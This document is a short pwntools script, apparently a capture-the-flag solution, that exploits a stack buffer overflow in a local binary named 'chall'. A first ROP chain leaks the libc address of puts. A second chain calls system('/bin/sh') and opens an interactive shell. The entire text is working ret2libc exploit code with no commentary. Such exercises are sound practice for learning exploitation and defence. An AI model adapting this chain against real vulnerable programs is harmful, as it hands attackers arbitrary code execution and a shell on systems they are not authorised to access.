#!/usr/bin/python2
from pwn import *

p = process('./chall')
elf = context.binary = ELF('./chall')
libc = elf.libc
padding = 0x28
pop_rdi = 0x0000000000401293 
ret_add = 0x000000000040101a
main = 0x0000000000401207

p.recvline()

payload = flat(
    'A' * padding,
    pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    main
)
p.sendline(payload)

leak = u64(p.recv(6).ljust(8,'\x00'))
print(hex(leak))
libc.address = leak - libc.sym['puts']
print(hex(libc.address))
payload = flat(
    'A' * 40,
    pop_rdi,
    next(libc.search('/bin/sh\x00')),
    ret_add, #ret
    libc.sym['system'],
    # libc.sym['exit']
)
p.sendline(payload)
p.interactive()
